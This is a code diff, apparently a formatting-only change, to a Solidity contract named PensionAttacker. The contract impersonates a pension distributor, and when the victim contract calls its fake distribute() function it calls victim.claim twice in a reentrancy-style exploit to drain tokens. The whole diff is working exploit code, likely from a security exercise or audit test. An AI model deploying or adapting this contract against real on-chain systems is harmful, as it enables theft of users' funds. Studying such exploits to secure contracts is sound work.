@@ -25,12 +25,16 @@ import "./interface/IPensionDistributor.sol";
 import "./interface/IPensionToken.sol";
 import "./interface/IPensionVictim.sol";
 
-contract PensionAttacker is IPensionDistributor{
-    IPensionToken token;
-    IPensionVictim victim;
-    IPensionDistributor distributor;
+contract PensionAttacker is IPensionDistributor {
+    IPensionToken public token;
+    IPensionVictim public victim;
+    IPensionDistributor public distributor;
 
-    constructor(IPensionVictim victim_address, IPensionToken token_address, IPensionDistributor distributor_address) {
+    constructor(
+        IPensionVictim victim_address,
+        IPensionToken token_address,
+        IPensionDistributor distributor_address
+    ) {
         victim = victim_address;
         token = token_address;
         distributor = distributor_address;
@@ -44,19 +48,16 @@ contract PensionAttacker is IPensionDistributor{
     }
 
     /// @notice oh~hh this is not the real distribute() function!
-    function distribute(address recipient, uint256 amount)
-        external
-        override
-    {
+    function distribute(address recipient, uint256 amount) external override {
         // mute warnings
-        recipient;amount;
-        if (msg.sender != address(victim)){
+        recipient;
+        amount;
+        if (msg.sender != address(victim)) {
             revert("Attacker:: Not the target.");
         }
-        if (token.balanceOf(address(distributor)) > 10 ** 18){
+        if (token.balanceOf(address(distributor)) > 10**18) {
             victim.claim(distributor, address(this));
             victim.claim(IPensionDistributor(address(this)), address(this));
         }
-
     }
 }
